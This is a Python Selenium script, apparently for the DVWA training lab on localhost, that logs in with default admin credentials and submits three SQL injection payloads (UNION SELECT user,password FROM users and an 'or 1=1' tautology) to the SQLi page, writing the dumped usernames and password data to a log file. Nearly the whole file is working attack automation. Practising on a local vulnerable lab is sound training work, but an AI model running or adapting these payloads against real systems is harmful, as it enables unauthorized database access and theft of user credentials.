from selenium import webdriver
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.support.ui import Select
from bs4 import BeautifulSoup
import time
from selenium.webdriver.common.by import By


def sqlinjection(host):
    timeToSleep=1
    #create a new Firefox session
    driver = webdriver.Chrome('/Users/jonghyeokkim/Downloads/chromedriver')

    #driver.implicitly_wait(30)
    driver.maximize_window()
        
    # navigate to the application home page
    driver.get(host+"/login.php")
        
    # get the search textbox
    username = driver.find_element("name","username")
    password=driver.find_element("name","password")

    # enter search keyword and submit
    username.send_keys("admin")
    password.send_keys("password")
    login=driver.find_element("name","Login")
    time.sleep(timeToSleep)
    login.click()


    driver.get(host+"/vulnerabilities/sqli/")
    inputElement = driver.find_element("name","id")

    #demo
    inputElement.send_keys("1' AND 1=0 UNION SELECT user,password FROM users #")
    time.sleep(timeToSleep)
    inputElement.send_keys(Keys.ENTER)
    time.sleep(1)

    # creating a log file 
    fp = open('sqloutput.log','w')

    soup = BeautifulSoup(driver.page_source, "lxml")
    page = soup.find('pre').getText()
    text = "\n\noutput of sql query which displays error in sql syntax\n\n"
    fp.write(text)
    fp.write(page)
    time.sleep(2)


    driver.get(host+"/vulnerabilities/sqli/")
    inputElement = driver.find_element("name","id")
    time.sleep(2)
    inputElement.send_keys("1 &' or 1=1#")
    time.sleep(2)
    inputElement.send_keys(Keys.ENTER)
    time.sleep(2)

    elem = driver.find_elements(By.CSS_SELECTOR, "pre")
    text = "\n\n output of sql query to retrive admin name details\n\n"
    fp.write(text)
    for el in elem:
        fp.write(el.text)

    driver.get(host+"/vulnerabilities/sqli/")
    inputElement = driver.find_element("name","id")
    time.sleep(2)
    inputElement.send_keys("%' AND 1=0 UNION SELECT user,password FROM users #")
    time.sleep(2)
    inputElement.send_keys(Keys.ENTER)
    time.sleep(2)

    elem = driver.find_elements(By.CSS_SELECTOR, "pre")   
    text = "\n\n output of sql query to retrive admin and password information\n\n"
    fp.write(text)
    for el in elem:
        fp.write(el.text)

    text = "\n\n ------- END of command sql injection log file -----------------\n\n"
    fp.write(text)
    fp.close()
    time.sleep(3)
    driver.close()
    
sqlinjection("http://localhost")
